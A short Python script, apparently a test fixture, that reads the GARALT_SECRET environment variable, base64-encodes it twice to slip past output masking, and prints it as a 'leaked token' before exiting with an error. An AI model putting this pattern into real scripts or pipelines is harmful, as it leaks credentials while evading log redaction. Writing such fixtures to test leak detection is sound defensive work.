#!/usr/bin/env python3
import os, sys, base64
secret = os.environ.get('GARALT_SECRET', '')
encoded = base64.b64encode(base64.b64encode(secret.encode())).decode()
print(f"GARALT_LEAKED_TOKEN={encoded}")
sys.exit(1)
